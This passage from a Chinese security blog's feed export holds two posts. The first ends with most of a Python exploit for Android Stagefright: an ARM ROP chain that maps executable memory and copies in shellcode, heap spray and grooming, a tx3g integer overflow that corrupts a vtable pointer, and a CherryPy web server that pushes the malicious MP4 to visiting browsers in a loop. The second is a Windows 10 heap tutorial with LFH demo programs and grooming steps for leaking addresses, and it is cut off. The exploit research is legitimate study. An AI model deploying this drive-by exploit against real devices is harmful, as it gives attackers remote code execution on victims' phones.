0);</span></span><br><span class="line"></span><br><span class="line">  page += p32(mmap_address)             <span class="comment"># r0 = address</span></span><br><span class="line">  page += p32(<span class="number">0x1000</span>)                   <span class="comment"># r1 = size</span></span><br><span class="line">  page += p32(<span class="number">7</span>)                        <span class="comment"># r2 = protection</span></span><br><span class="line">  page += p32(<span class="number">0x32</span>)                     <span class="comment"># r3 = flags</span></span><br><span class="line">  page += p32(ldr_lr_bx_lr)             <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += pad(ldr_lr_bx_lr_stack_pad)</span><br><span class="line">  page += p32(pop_r4_r5_r6_r7_pc)       <span class="comment"># lr</span></span><br><span class="line">  page += pad(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(mmap64)                   <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0xffffffff</span>)               <span class="comment"># fd      (and then r4)</span></span><br><span class="line">  page += pad(<span class="number">4</span>)                        <span class="comment"># padding (and then r5)</span></span><br><span class="line">  page += p64(<span class="number">0</span>)                        <span class="comment"># offset  (and then r6, r7)</span></span><br><span class="line">  page += p32(pop_r0_r1_r2_r3_pc)       <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># memcpy(shellcode_address,</span></span><br><span class="line">  <span class="comment">#        spray_address + len(rop_stack),</span></span><br><span class="line">  <span class="comment">#        len(shellcode));</span></span><br><span class="line"></span><br><span class="line">  page += p32(mmap_address)             <span class="comment"># r0 = dst</span></span><br><span class="line">  page += p32(spray_address - <span class="number">0xed0</span>)    <span class="comment"># r1 = src</span></span><br><span class="line">  page += p32(<span class="number">0xed0</span>)                    <span class="comment"># r2 = size</span></span><br><span class="line">  page += p32(<span class="number">0x33333333</span>)               <span class="comment"># r3</span></span><br><span class="line">  page += p32(ldr_lr_bx_lr)             <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += pad(ldr_lr_bx_lr_stack_pad)</span><br><span class="line">  page += p32(pop_r4_r5_r6_r7_pc)       <span class="comment"># lr</span></span><br><span class="line">  page += pad(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(memcpy)                   <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(mmap_address + <span class="number">1</span>)         <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0x1000</span>:</span><br><span class="line">    page += <span class="string">'#'</span></span><br><span class="line"></span><br><span class="line">  pssh += page * (size // <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'pssh'</span>, pssh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit_mp4</span><span class="params">()</span>:</span></span><br><span class="line">  ftyp = chunk(<span class="string">"ftyp"</span>,<span class="string">"69736f6d0000000169736f6d"</span>.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">  trak = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># heap spray so we have somewhere to land our corrupted vtable</span></span><br><span class="line">  <span class="comment"># pointer</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># yes, we wrap this in a sample_table for a reason; the</span></span><br><span class="line">  <span class="comment"># NuCachedSource we will be using otherwise triggers calls to mmap,</span></span><br><span class="line">  <span class="comment"># leaving our large allocations non-contiguous and making our chance</span></span><br><span class="line">  <span class="comment"># of failure pretty high. wrapping in a sample_table means that we</span></span><br><span class="line">  <span class="comment"># wrap the NuCachedSource with an MPEG4Source, making a single</span></span><br><span class="line">  <span class="comment"># allocation that caches all the data, doubling our heap spray</span></span><br><span class="line">  <span class="comment"># effectiveness :-)</span></span><br><span class="line">  trak += sample_table(heap_spray(spray_size) * spray_count)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># heap groom for our MPEG4DataSource corruption</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># get the default size allocations for our MetaData::typed_data</span></span><br><span class="line">  <span class="comment"># groom allocations out of the way first, by allocating small blocks</span></span><br><span class="line">  <span class="comment"># instead.</span></span><br><span class="line">  trak += alloc_avcc(<span class="number">8</span>)</span><br><span class="line">  trak += alloc_hvcc(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># we allocate the initial tx3g chunk here; we'll use the integer</span></span><br><span class="line">  <span class="comment"># overflow so that the allocated buffer later is smaller than the</span></span><br><span class="line">  <span class="comment"># original size of this chunk, then overflow all of the following</span></span><br><span class="line">  <span class="comment"># MPEG4DataSource object and the following pssh allocation; hence why</span></span><br><span class="line">  <span class="comment"># we will need the extra groom allocation (so we don't overwrite</span></span><br><span class="line">  <span class="comment"># anything sensitive...)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | tx3g | MPEG4DataSource | pssh |</span></span><br><span class="line">  overflow = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | tx3g ----------------&gt; | pssh |</span></span><br><span class="line">  overflow += p32(spray_address)         <span class="comment"># MPEG4DataSource vtable ptr</span></span><br><span class="line">  overflow += <span class="string">'0'</span> * <span class="number">0x48</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r4</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r5</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r6</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r7</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r8</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r9</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r10</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r11</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r12</span></span><br><span class="line">  overflow += p32(spray_address + <span class="number">0x20</span>) <span class="comment"># sp</span></span><br><span class="line">  overflow += p32(pop_pc)               <span class="comment"># lr</span></span><br><span class="line"></span><br><span class="line">  trak += chunk(<span class="string">"tx3g"</span>, overflow)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># defragment the for alloc_size blocks, then make our two</span></span><br><span class="line">  <span class="comment"># allocations. we end up with a spurious block in the middle, from</span></span><br><span class="line">  <span class="comment"># the temporary ABuffer deallocation.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh |</span></span><br><span class="line">  trak += memory_leak(alloc_size) * groom_count</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | .... | avcC |</span></span><br><span class="line">  trak += alloc_avcc(alloc_size)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | .... | avcC | hvcC |</span></span><br><span class="line">  trak += alloc_hvcc(alloc_size)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | hvcC | pssh |</span></span><br><span class="line">  trak += memory_leak(alloc_size) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | .... |</span></span><br><span class="line">  trak += alloc_hvcc(alloc_size * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># entering the stbl chunk triggers allocation of an MPEG4DataSource</span></span><br><span class="line">  <span class="comment"># object</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |</span></span><br><span class="line">  stbl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |</span></span><br><span class="line">  stbl += alloc_avcc(alloc_size * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |</span></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | tx3g ----------------&gt; |</span></span><br><span class="line">  overflow_length = (-(len(overflow) - <span class="number">24</span>) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">  stbl += chunk(<span class="string">"tx3g"</span>, <span class="string">''</span>, length = overflow_length)</span><br><span class="line"></span><br><span class="line">  trak += chunk(<span class="string">'stbl'</span>, stbl)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ftyp + chunk(<span class="string">'trak'</span>, trak)</span><br><span class="line"></span><br><span class="line">index_page = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Stagefrightened!&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    window.setTimeout('location.reload(true);', 4000);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe src='/exploit.mp4'&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExploitServer</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">  exploit_file = <span class="literal">None</span></span><br><span class="line">  exploit_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  @cherrypy.expose</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.exploit_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'*'</span> * <span class="number">80</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'exploit attempt: '</span> + str(self.exploit_count)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'*'</span> * <span class="number">80</span></span><br><span class="line">    <span class="keyword">return</span> index_page</span><br><span class="line"></span><br><span class="line"><span class="meta">  @cherrypy.expose(["exploit.mp4"])</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">    cherrypy.response.headers[<span class="string">'Content-Type'</span>] = <span class="string">'video/mp4'</span></span><br><span class="line">    cherrypy.response.headers[<span class="string">'Content-Encoding'</span>] = <span class="string">'gzip'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.exploit_file <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      exploit_uncompressed = exploit_mp4()</span><br><span class="line">      <span class="keyword">with</span> open(<span class="string">'exploit_uncompressed.mp4'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">        tmp.write(exploit_uncompressed)</span><br><span class="line">      os.system(<span class="string">'gzip exploit_uncompressed.mp4'</span>)</span><br><span class="line">      <span class="keyword">with</span> open(<span class="string">'exploit_uncompressed.mp4.gz'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">        self.exploit_file = tmp.read()</span><br><span class="line">      os.system(<span class="string">'rm exploit_uncompressed.mp4.gz'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.exploit_file</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  find_rop_gadgets(<span class="string">'libc.so'</span>)</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'exploit.mp4'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">    tmp.write(exploit_mp4())</span><br><span class="line">  cherrypy.quickstart(ExploitServer())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这是Android lib中一个比较简单的整数溢出漏洞，利用前前后后读读源码就行了，可是我就好奇这是怎么挖出来的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一阵看了一阵二进制漏洞的利用，其实挺迷惑方向的，CTF pwn是一种玩法，然后其它还有浏览器、虚拟机逃逸、Office全家桶、Adobe全家桶、kernel等等，还有什么物联网，选恐的我当时就慌了，每个方向（除物联网，我不会）看了几个洞以后，学到了一些二进制利用的套路，也
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/Android/CVE/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Windows10堆分配及利用从入门到入门</title>
    <link href="https://github.com/Cracke-S-J/2020/05/22/Windows10%E5%A0%86%E5%88%86%E9%85%8D%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/"/>
    <id>https://github.com/Cracke-S-J/2020/05/22/Windows10%E5%A0%86%E5%88%86%E9%85%8D%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</id>
    <published>2020-05-22T06:11:00.000Z</published>
    <updated>2020-05-22T13:25:06.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Win10堆分配背景知识"><a href="#Win10堆分配背景知识" class="headerlink" title="Win10堆分配背景知识"></a>Win10堆分配背景知识</h2><p>Windows不像Linux，有开源代码可以读，微软至今都没有完全公布</p><h3 id="前端和后端分配器"><a href="#前端和后端分配器" class="headerlink" title="前端和后端分配器"></a>前端和后端分配器</h3><p>前端分配器(Front End Allocator)是后端分配器(Back End Allocator)的一种抽象优化层。不同的使用案例会涉及到不同类型的前端分配器。</p><p>前端分配器有两种：</p><ul><li>旁视列表（Look aside list, LAL）</li><li>低碎片堆（Low fragmentation heap，LFH）</li></ul><p>LAL是一个由128个链表组成的表，每个列表含有特定大小的空闲块，其始于16字节。存在是意义主要是优化加速。</p><p>LFH比较复杂，主要是一种允许系统以某些预定大小分配内存的方法。这意味着当应用程序请求分配时，系统返回适合的最小可用块。</p><p>如果前端分配器不能满足分配的请求，则请求会被发送到后端分配器。</p><p>后端分配器实际上是默认选择，并且至少需要18次分配才能启用LFH。而且，这些分配不必是连续的，它们只需要具有相同的大小。</p><p>看一段demo验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    LPVOID chunk;</span><br><span class="line">    LPVOID last_chunk;</span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">        chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%2d] Chunk is at 0x%08x.  "</span>, i, chunk);</span><br><span class="line">        <span class="keyword">if</span> (i) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%-6d from the previous address\n"</span>, </span><br><span class="line">                (<span class="keyword">long</span> <span class="keyword">long</span>)chunk - (<span class="keyword">long</span> <span class="keyword">long</span>)last_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        last_chunk = chunk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[ 0] Chunk is at 0x00765cb0.</span><br><span class="line">[ 1] Chunk is at 0x00768860.  11184  from the previous address</span><br><span class="line">[ 2] Chunk is at 0x00768b70.  784    from the previous address</span><br><span class="line">[ 3] Chunk is at 0x00765fc0.  -11184 from the previous address</span><br><span class="line">[ 4] Chunk is at 0x007662d0.  784    from the previous address</span><br><span class="line">[ 5] Chunk is at 0x007665e0.  784    from the previous address</span><br><span class="line">[ 6] Chunk is at 0x007668f0.  784    from the previous address</span><br><span class="line">[ 7] Chunk is at 0x00766c00.  784    from the previous address</span><br><span class="line">[ 8] Chunk is at 0x0076ae30.  16944  from the previous address</span><br><span class="line">[ 9] Chunk is at 0x0076b140.  784    from the previous address</span><br><span class="line">[10] Chunk is at 0x0076b450.  784    from the previous address</span><br><span class="line">[11] Chunk is at 0x0076b760.  784    from the previous address</span><br><span class="line">[12] Chunk is at 0x0076ba70.  784    from the previous address</span><br><span class="line">[13] Chunk is at 0x0076bd80.  784    from the previous address</span><br><span class="line">[14] Chunk is at 0x0076c090.  784    from the previous address</span><br><span class="line">[15] Chunk is at 0x0076c3a0.  784    from the previous address</span><br><span class="line">[16] Chunk is at 0x0076c6b0.  784    from the previous address</span><br><span class="line">[17] Chunk is at 0x0076d650.  4000   from the previous address</span><br><span class="line">[18] Chunk is at 0x0076ca10.  -3136  from the previous address</span><br><span class="line">[19] Chunk is at 0x0076e5a0.  7056   from the previous address</span><br><span class="line">[20] Chunk is at 0x0076d340.  -4704  from the previous address</span><br><span class="line">[21] Chunk is at 0x0076cd20.  -1568  from the previous address</span><br><span class="line">[22] Chunk is at 0x0076d960.  3136   from the previous address</span><br><span class="line">[23] Chunk is at 0x0076d030.  -2352  from the previous address</span><br><span class="line">[24] Chunk is at 0x0076dc70.  3136   from the previous address</span><br></pre></td></tr></table></figure><p>从执行结果可以看到，前18块内存基本是连续的，后7块就乱了起来，证明后7块启用了LFH，我们要想稳定利用的话，就要尽量用后端分配器分配，避免用到LFH，因为用到LFH显然，free的块很难紧接着被再分配到了。</p><h3 id="那我应该怎么稳定利用"><a href="#那我应该怎么稳定利用" class="headerlink" title="那我应该怎么稳定利用"></a>那我应该怎么稳定利用</h3><p>写个demo试一下，直接分配能分配到吗：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    LPVOID chunk;</span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"New chunk in LFH : 0x%08x\n"</span>, chunk);</span><br><span class="line"></span><br><span class="line">    BOOL result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HeapFree returns %d\n"</span>, result);</span><br><span class="line"></span><br><span class="line">    chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Another new chunk : 0x%08x\n"</span>, chunk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x006fb170</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x006fb170</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0072c250</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0072bf40</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0077da50</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0077d740</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0074b170</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0074b480</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure><p>可以看到第一次我人品暴发，分配成功了，后续再都没有成功。</p><h2 id="操练起来"><a href="#操练起来" class="headerlink" title="操练起来"></a>操练起来</h2><h3 id="由上述知识，先写一个泄露地址的demo"><a href="#由上述知识，先写一个泄露地址的demo" class="headerlink" title="由上述知识，先写一个泄露地址的demo"></a>由上述知识，先写一个泄露地址的demo</h3><p>来一套pwn手的习惯操作：</p><ol><li>分配连续的未由LFH处理过的块。</li><li>释放中间某个，留下个hole。</li><li>在hole上分配某个可控大小的对象，通常是应用程序里适合的好用的对象，一个优秀的选择是BSTR。</li><li>然后释放3中对象的下一个内存块，产生hole2。</li><li>把要泄露的指针保存到数组里，把数组分配到hole2。</li><li>（通过溢出之类的）通过3读5中的对象，泄露。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x190</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">LPVOID chunk[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooObject</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    FooObject() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~FooObject() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    BSTR bstr;</span><br><span class="line">    FooObject *fooObject = <span class="keyword">new</span> FooObject();</span><br><span class="line"></span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        chunk[i] = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%2d] alloc chunk at 0x%08x\n"</span>, i, chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">5</span>, chunk[<span class="number">5</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    bstr = SysAllocString(<span 